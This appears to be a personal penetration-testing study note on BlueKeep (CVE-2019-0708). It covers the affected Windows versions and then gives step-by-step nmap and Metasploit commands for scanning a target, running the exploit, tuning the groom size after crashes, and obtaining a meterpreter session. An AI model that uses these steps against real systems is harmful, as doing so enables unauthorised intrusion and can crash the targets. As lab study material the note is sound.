# Exploiting RDP: BlueKeep
> This is an inherent vulnerability within RDP that can allow us to gain access via, for example, a meterpreter shell.

## Contents
- [Intro](#)
  - [CVE-2019-0708 - BlueKeep](#)
  - [Problem](#)
  - [Vulnerable Systems](#)
  - [The BlueKeep Exploit](#)
- [Exploit](#)
  - [1. Scan](#)
  - [2. MSF: BlueKeep](#)

## Intro

### CVE-2019-0708 - BlueKeep
- BlueKeep (CVE-2019-0708) is the name given to an RDP vulnerability in Windows that could potentially allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.
- The BlueKeep vulnerability was made public by Microsoft in May 2019.
- The BlueKeep exploit takes advantage of a vulnerability in Windows RDP protocol that allows attackers to gain access to a chunk of kernel memory consequently allowing them to remotely execute arbitrary code at the system level without authentication.

### Problem
- Running arbitrary code and mucking around in kernel memory will likely cause a system crash.

### Vulnerable Systems
- Microsoft released a patch for this vulnerability on 05/14/2019 and has urged companies to patch this vulnerability as soon as possible.
- At the time of discovery, about one million systems worldwide were found to be vulnerabile
- The BlueKeep vulnerability affects multiple versions of Windows:
  - XP, Vista, Win7
  - Windows Server 2008 & R2

### The BlueKeep Exploit
- The BlueKeep vulnerability has various illegitimate PoC (Proof of Concepts) and exploit code could be malicious in nature. It is there recommended to only utilize verified exploit code and modules for exploitation.
- MetaSploit: 
  - **Scanner:** MSF has an auxiliary module that can be used to check if a target system is vulnerable to the BlueKeep exploit.
  - **Exploit:** MSF also also has an exploit module that can be used to exploit the vulnerability on unpatched systems. (Unpatched systems; gain a privileged meterpreter session on the target.)

## Exploit

### 1. Scan
```
nmap -sS -sV -sC -O -T4 -p- [target ip]
```
- Remember: Port 3389 (tcp) is registered for Windows Based Terminal (WBT) and Remote Desktop Protocol (RDP). 

### 2. MSF: BlueKeep
```
service postgresql status|start
msfconsole
> search BlueKeep   (should result in two: the scan and the exploit)
> use [the scanner]
> show and check options (you should only need to set RHOSTS)
> run (and you should get nice happy result back)
```
- If you get a positive result back from the scan, run the exploit...
  - Confirm the default payload is aligned with your target system (change if necessary).
  - You set the RHOSTS and run it (doesn't seem like there is anything else to set).
  - It'll likely fail and give you a warning about setting the target host manually.
  - `> show targets` : This will give you a list of Windows versions you can select to target. Find your target's system, and...
  - `set target [number of target in list]`
  - `run`
- If it fails, the target system will crash. **_And then you need to modify the `groom` size and try it again_**.
- If it works you get a meterpreter session (`sysinfo` should show you the target machine description; `getuid` should show you your privileges).
